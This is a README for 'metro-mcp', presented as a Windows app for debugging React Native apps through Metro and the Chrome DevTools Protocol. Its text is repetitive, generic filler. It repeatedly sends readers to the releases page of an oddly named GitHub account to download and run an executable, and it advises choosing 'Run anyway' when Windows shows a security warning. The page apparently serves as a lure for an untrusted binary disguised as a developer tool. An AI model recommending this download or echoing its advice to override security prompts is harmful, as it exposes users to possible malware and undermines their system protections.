# 🚇 metro-mcp - Debug React Native with less effort

[![Download metro-mcp](https://img.shields.io/badge/Download%20metro-mcp-blue?style=for-the-badge)](https://github.com/Rumanian-alveolarbed219/metro-mcp/releases)

## 🧭 What metro-mcp does

metro-mcp is a Windows app that helps you inspect and debug React Native apps through Metro and the Chrome DevTools Protocol.

It is built for people who want to check what their app is doing without changing app code for most tasks. You can use it to look at runtime state, track issues, and run common debug actions from one place.

## 💻 What you need

Before you start, make sure you have:

- A Windows 10 or Windows 11 PC
- Internet access
- A React Native app, or an Expo app, you want to inspect
- Metro bundler running for that app
- Chrome installed on your PC

For best results, use a recent version of Node.js if your setup needs it for Metro or React Native work.

## 📥 Download metro-mcp

Visit this page to download metro-mcp for Windows:

https://github.com/Rumanian-alveolarbed219/metro-mcp/releases

On the releases page:

1. Find the latest release
2. Open the Assets section
3. Download the Windows file
4. Save it to a folder you can find again

If you see a zip file, extract it first before you run the app.

## 🛠️ Install and run on Windows

After you download the app:

1. Open the folder where the file was saved
2. If the file is zipped, right-click it and choose Extract All
3. Open the extracted folder
4. Double-click the metro-mcp app file
5. If Windows shows a security prompt, choose Run anyway if you trust the source

If the app opens in a small window or starts in the tray, that is normal for this type of tool.

## 🔌 Connect it to your React Native app

To use metro-mcp, your React Native app must already be running with Metro.

1. Start your app as you normally would
2. Make sure Metro bundler is active
3. Open metro-mcp
4. Let it detect the running Metro session

If you use Expo, start your project in the usual Expo dev mode first. metro-mcp can then connect to the same runtime path used by the app.

## 🧪 What you can do with it

metro-mcp is meant for day-to-day debugging and inspection. Common tasks include:

- View runtime data from the app
- Check app state while it is running
- Inspect the React Native debug session
- Watch network or runtime activity through CDP
- Run simple automation steps during debugging
- Work with plugins that extend the tool

Because it connects through Metro and Chrome DevTools Protocol, it can fit into many React Native and Expo setups without extra app changes.

## 🧩 Plugin-based setup

metro-mcp uses plugins so you can turn features on or off based on what you need.

This helps keep the tool focused. For example, one plugin may help with inspection, while another may help with automation or runtime checks.

A plugin-based setup is useful when you want:

- A smaller tool with only the features you need
- A cleaner way to add new debug actions
- A setup that can grow with your workflow

## 🖥️ First run checklist

If the app does not connect right away, check these items:

- Metro is running
- Your React Native or Expo app is open
- Chrome is installed
- You are using the same machine for the app and metro-mcp
- No other debug tool is holding the same connection

If you use a firewall, allow local app traffic when Windows asks for permission.

## ⚙️ Basic use flow

A simple way to use metro-mcp is:

1. Start your React Native or Expo app
2. Start Metro
3. Open metro-mcp on Windows
4. Let it connect
5. Use the available tools to inspect or debug the app

This keeps the setup simple and reduces the need to edit app code for routine checks.

## 📁 Typical folder layout

After you download and extract the release, you may see files like:

- metro-mcp.exe
- A config file
- A plugins folder
- A logs folder
- Readme or license files

Do not move files around unless you need to. Keep the app and its support files in the same folder so it can start cleanly.

## 🔍 Troubleshooting

If metro-mcp does not start:

- Check that the download finished fully
- Extract the zip file again
- Run the app from a local folder, not from inside the zip
- Restart Windows and try again

If it opens but does not connect:

- Confirm Metro is running
- Reload your React Native app
- Check that Chrome is installed
- Close other tools that may use the same debug port

If you still do not see a connection:

- Close metro-mcp
- Stop Metro
- Start Metro again
- Open metro-mcp again

## 📌 Common use cases

metro-mcp is useful when you want to:

- Inspect a React Native app while it runs
- Check Expo runtime behavior
- Debug problems without changing app code
- Automate repeat checks during development
- Use a tool that works with Chrome DevTools Protocol

## 🧷 Files and connection behavior

metro-mcp does not need you to edit your app for most basic tasks. It works by connecting to the runtime through Metro and the browser debug channel.

That makes it useful for quick checks during active development, especially when you want to keep your app code unchanged.

## 🧭 Download and setup path

1. Go to https://github.com/Rumanian-alveolarbed219/metro-mcp/releases
2. Download the latest Windows release
3. Extract the file if it comes as a zip
4. Run the app
5. Start Metro and connect your app
6. Open the tools you need for inspection or automation

## 📎 Project focus

metro-mcp is built around:

- React Native runtime debugging
- Metro bundler connection
- Chrome DevTools Protocol access
- Inspection tools
- Automation through MCP
- Plugin support for extra features